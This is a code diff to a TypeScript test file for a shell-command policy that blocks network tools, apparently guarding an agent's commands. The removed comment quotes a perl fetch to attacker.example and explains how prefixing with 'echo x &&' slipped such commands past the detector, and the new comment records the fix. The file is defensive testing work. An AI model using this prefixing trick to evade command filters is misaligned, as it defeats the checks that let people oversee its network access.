@@ -17,26 +17,36 @@ import { cleanup, runsRealRunner, spawnDeniedRun } from "./overhead.js";
 /**
  * Known bypass signatures, as `tool|wrapper`.
  *
- * `perl|and-chain`: `&&`-chaining hides perl from the network-tool detector.
- * `perl -MLWP::Simple -e 'get("https://attacker.example/")'` is denied on its
- * own, and denied behind `cd /tmp;` or inside a subshell, but ALLOWED behind
- * `echo start &&`. curl and wget are still denied in the same position, so this
- * is specific to how perl is recognised, not to `&&` generally.
+ * EMPTY, and that is the point. It held `perl|and-chain` for exactly as long as
+ * the bypass existed.
  *
- * Found by generation, not by hand: nobody wrote this case, the cross product
- * emitted it. Reported to Person 1 (rules) and Person 2 (corpus) rather than
- * fixed here — neither file belongs to this lane.
+ * The root cause was broader than perl. The textual-URL carve-out in
+ * `command-policy.ts` was anchored to the START of the command line, so any
+ * command prefixed with a textual one - `echo x &&`, `printf x &&`,
+ * `git commit -m z &&`, `echo x ;`, `echo x |` - was exempted from the
+ * destination-without-a-recognised-tool rule. perl was merely the tool in this
+ * bank that fell outside both ALWAYS_NETWORK and INLINE_NETWORK; the same
+ * prefix hid `python3 fetch.py URL`, `node fetch.js URL`, `java -jar t.jar URL`
+ * and any in-workspace script.
+ *
+ * Fixed by scoping the carve-out to the segment that actually carries the
+ * destination. Bank: 3,416/3,430 -> 3,430/3,430. `and-chain` stratum:
+ * 95.92% -> 100%.
+ *
+ * Adding a signature here is how a residual gets accepted. Do it with a reason,
+ * never to turn a red build green.
  */
-export const DOCUMENTED_BYPASS_SIGNATURES: readonly string[] = ["perl|and-chain"];
+export const DOCUMENTED_BYPASS_SIGNATURES: readonly string[] = [];
 
 /**
  * Ratchet, not a target.
  *
- * The count observed when the bank was first generated. It exists so the number
- * cannot silently grow; it is not a budget to spend. Lowering it as rules
- * improve is the point. Raising it requires saying why in the commit.
+ * Was 14 when the bank was first generated; now 0, because the class those 14
+ * belonged to was fixed rather than accepted. Lowering it as the rules improve
+ * was always the point, and this is that happening. Raising it requires saying
+ * why in the commit.
  */
-export const MAX_KNOWN_BYPASSES = 14;
+export const MAX_KNOWN_BYPASSES = 0;
 
 const pct = (value: number) => (value * 100).toFixed(2) + "%";
 const rule = (char = "-") => console.log(char.repeat(78));
